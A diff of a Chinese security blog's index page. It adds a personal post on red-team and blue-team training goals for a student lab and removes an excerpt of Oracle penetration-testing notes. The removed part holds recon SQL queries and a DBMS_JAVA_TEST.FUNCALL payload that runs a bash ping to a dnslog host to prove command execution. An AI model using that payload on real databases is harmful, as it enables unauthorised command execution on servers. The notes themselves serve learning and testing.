@@ -16,8 +16,8 @@
 <meta property="og:type" content="website" />
 <meta property="og:title" content="哨兵安全博客 | ©「哨兵」| Sentry Security" />
 <meta property="og:description" content="本站由哨兵安全实验室支持创办" />
-<meta property="og:image" content="http://localhost:80/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
-<meta property="og:url" content="http://localhost:80/blog/" />
+<meta property="og:image" content="http://localhost:81/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="http://localhost:81/blog/" />
 
 <title>哨兵安全博客 | ©「哨兵」| Sentry Security</title>
 
@@ -71,6 +71,62 @@
     <! -- BLOG POSTS LIST -->
     <div class="col-lg-9">
 
+      
+      <! -- Blog Post -->
+      <div class="row">
+        <div class="col-lg-12">
+          <a href="/blog/2021/thereis-something2say/"><h3 class="ctitle">辛丑·本命年 年后的一些思考</h3></a>
+          <p><csmall>Mar 13, 2021. | By: Bin4xin</csmall></p>
+        </div>
+
+        
+        <div class="col-log-12">
+          <p>过完年回合肥已经接近一个月之久了，今年是本命年，也希望自己能够能够比20年更加努力。回了公司就按照计划忙些有意义的：</p>
+
+<ul>
+  <li>一切正在有条不紊的进行着：</li>
+</ul>
+
+<p>按照新年的规划，过来需要沉淀的便是Shiro框架。过完年回来就面临着护网，在20年靠着这个为公司护网“打下了一片江山”，今年应进一步理解；</p>
+
+<p><strong>说些没用的：</strong></p>
+
+<p>过年回来后，忙里偷闲与学校网安实验室的孩子们开了一次线下交流会，交流会的主要内容就是总结寒假以来的学习过程和心得汇报；因为年纪较小，基本都是刚大一、大二，所以偶尔也要进行大学生活困扰的解惑；</p>
+
+<ul>
+  <li>网安实验室队伍安排：
+    <ul>
+      <li>导师：
+  队伍灵魂；</li>
+      <li>我的角色：
+  我想，我在这个队伍里扮演的角色应该是作为行业“过来人”对他们的学习计划进行有效的监督和建议。</li>
+      <li>攻击队伍（红队）要求：
+        <ul>
+          <li>1.熟悉各种漏洞特征和利用原理；</li>
+          <li>2.能够基本读懂POC代码所进行的操作，并自己有一定的编程能力和代码审计能力；</li>
+          <li>3.熟悉市面主流WAF的识别、WAF规则探测、绕过以及攻击WAF后的资产。</li>
+        </ul>
+      </li>
+      <li>防守队伍（蓝队）要求：
+        <ul>
+          <li>1.熟悉各类漏洞形成原因、及时跟进互联网上爆出的各种0day、1day、Nday，并对频繁爆出漏洞的组件有深刻的理解，如WebLogic反序列化、Shiro反序列化、各种（SQL、模版）注入等等；</li>
+          <li>2.熟悉主流操作系统Linux、Windows的工作原理如软件编译安装能力、集群的独立运维能力以及安全事件朔源能力；</li>
+          <li>3.能够做到独立部署安全（审计）平台或安全工具，如WAF以及WAF工作涉及的规则库编写。</li>
+        </ul>
+      </li>
+      <li>数据挖掘类，涉及到算法应用等；不多说。</li>
+      <li>开发类；不多说。</li>
+    </ul>
+  </li>
+</ul>
+
+          <p><a href="/blog/2021/thereis-something2say/">[Read More]</a></p>
+        </div>
+        
+      </div>
+      <div class="hline"></div>
+
+      <div class="spacing"></div>
       
       <! -- Blog Post -->
       <div class="row">
@@ -227,99 +283,6 @@ if($link-&gt;FetchArray($link-&gt;query("SELECT * FROM User WHERE `Identity`='$U
 <p>咳咳，跑偏了，以上来看就直接修改ini文件就行了。</p>
 
           <p><a href="/blog/2020/php-depoly/">[Read More]</a></p>
-        </div>
-        
-      </div>
-      <div class="hline"></div>
-
-      <div class="spacing"></div>
-      
-      <! -- Blog Post -->
-      <div class="row">
-        <div class="col-lg-12">
-          <a href="/blog/2020/Oracle-sql/"><h3 class="ctitle">随笔记：Oracle数据库的渗透测试</h3></a>
-          <p><csmall>Oct 29, 2020. | By: Bin4xin</csmall></p>
-        </div>
-
-        
-        <div class="col-log-12">
-          <p>使用docker进行oracle数据库渗透测试，环境如下：</p>
-
-<p><a href="https://www.jianshu.com/p/b30021a421b8">docker启动oracle</a></p>
-
-<p>参考链接：<a href="https://www.freebuf.com/articles/web/5411.html">Oracle爆错手工注入</a></p>
-
-<p>渗透常用语句：</p>
-
-<pre><code class="language-mysql">
-1 当前用户权限 
-select * from session_roles
-2 当前数据库版本 
-select banner from sys.v_$version where rownum=1
-3 服务器出口IP 
-用utl_http.request 可以实现
-4 服务器监听IP d
-select utl_inaddr.get_host_address from dual
-5 服务器操作系统
-select member from v$logfile where rownum=1
-6 服务器sid查询，远程连接的话需要
-select instance_name fromv$instance;
-7 当前连接用户
-select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual
-</code></pre>
-
-<p>版本：</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from v<span class="nv">$version</span><span class="p">;</span>
-
-Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production
-PL/SQL Release 11.2.0.4.0 - Production
-CORE	11.2.0.4.0	Production
-TNS <span class="k">for </span>Linux: Version 11.2.0.4.0 - Production
-NLSRTL Version 11.2.0.4.0 - Production
-
-</code></pre></div></div>
-<p>oracleShell.jar环境</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - Production
-PL/SQL Release 11.2.0.1.0 - Production
-<span class="s2">"CORE	11.2.0.1.0	Production"</span>
-TNS <span class="k">for </span>32-bit Windows: Version 11.2.0.1.0 - Production
-NLSRTL Version 11.2.0.1.0 - Production
-</code></pre></div></div>
-
-<p>select utl_inaddr.get_host_address from dual</p>
-
-<p>172.17.0.2</p>
-
-<p>补丁：</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from dba_registry_history<span class="p">;</span>
-
-
-2018-04-25 12:22:17.105985	APPLY	SERVER	11.2.0.4	0	PSU	Patchset 11.2.0.2.0
-</code></pre></div></div>
-<p>权限：</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from session_roles<span class="p">;</span>
-
-CONNECT
-RESOURCE
-DBA
-SELECT_CATALOG_ROLE
-HS_ADMIN_SELECT_ROLE
-EXECUTE_CATALOG_ROLE
-HS_ADMIN_EXECUTE_ROLE
-DELETE_CATALOG_ROLE
-EXP_FULL_DATABASE
-IMP_FULL_DATABASE
-DATAPUMP_EXP_FULL_DATABASE
-DATAPUMP_IMP_FULL_DATABASE
-GATHER_SYSTEM_STATISTICS
-SCHEDULER_ADMIN
-WM_ADMIN_ROLE
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Select DBMS_JAVA_TEST.FUNCALL<span class="o">(</span><span class="s1">'oracle/aurora/util/Wrapper'</span>,<span class="s1">'main'</span>,<span class="s1">'/bin/bash'</span>,<span class="s1">'-c'</span>,<span class="s1">'ping ojuht0.dnslog.cn'</span><span class="o">)</span> from dual<span class="p">;</span>
-</code></pre></div></div>
-
-          <p><a href="/blog/2020/Oracle-sql/">[Read More]</a></p>
         </div>
         
       </div>
@@ -8015,7 +7978,7 @@ ssh -l jack pass
     
         <p>
             <a href=""><i class="fa fa-angle-right"></i> Sql-inject</a>
-            <span class="badge badge-theme pull-right">3</span>
+            <span class="badge badge-theme pull-right">2</span>
         </p>
     
         <p>
@@ -8100,7 +8063,7 @@ ssh -l jack pass
         
             <a class="btn btn-theme" href="" role="button">Cve (9)</a>	         
         
-            <a class="btn btn-theme" href="" role="button">Sql-inject (3)</a>	         
+            <a class="btn btn-theme" href="" role="button">Sql-inject (2)</a>	         
         
             <a class="btn btn-theme" href="" role="button">Bash (2)</a>	         
         
